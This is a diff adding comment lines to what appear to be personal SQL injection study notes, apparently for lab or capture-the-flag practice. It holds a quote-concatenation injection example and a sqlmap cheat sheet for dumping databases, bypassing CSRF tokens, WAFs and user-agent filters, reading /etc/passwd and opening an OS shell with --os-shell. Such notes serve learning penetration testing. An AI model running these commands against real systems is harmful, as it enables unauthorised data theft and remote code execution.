@@ -48,5 +48,39 @@
 
 // select * where username='admin' and password='sldkfjdlj'
 // =>                       ad'||'min           a' is not b'
-
-
+//! sqlmap
+//* get dbs
+// sqlmap -u "http://target.com/page.php?id=1" --dbs
+//* get tables
+// sqlmap -u "http://target.com/page.php?id=1" --tables
+//* get content
+// sqlmap -u "http://target.com/page.php?id=1" --dump
+//* you can specify a specific table inside a db
+// sqlmap -u "http://target.com/page.php?id=1" -D db_name -T table_name --dump
+//* send post requests
+// sqlmap -u 'http://www.example.com/' --data 'id=1'
+// sqlmap -u 'http://94.237.54.145:56567/action.php' --data '{"id":"1"}' --dump
+//* process cookies
+// sqlmap -u 'http://www.example.com/' --cookie='id=1' --level=2
+//* show errors
+// sqlmap -u "http://target.com/page.php?id=1" --parse-errors
+//* get general data
+// --banner
+// --current-user
+// --current-db
+// --is-dba
+// --schema
+//* Anti-CSRF Token Bypass
+// sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+//* Unique Value Bypass
+// sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp
+//* Calculated Parameter Bypass
+// sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
+//* WAF Bypass
+// --skip-waf
+//* User-agent Blacklisting Bypass
+// --random-agent
+//* reading a file
+// sqlmap -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
+//* remote shell
+// sqlmap -u "http://94.237.48.12:38728/?id=1" --os-shell
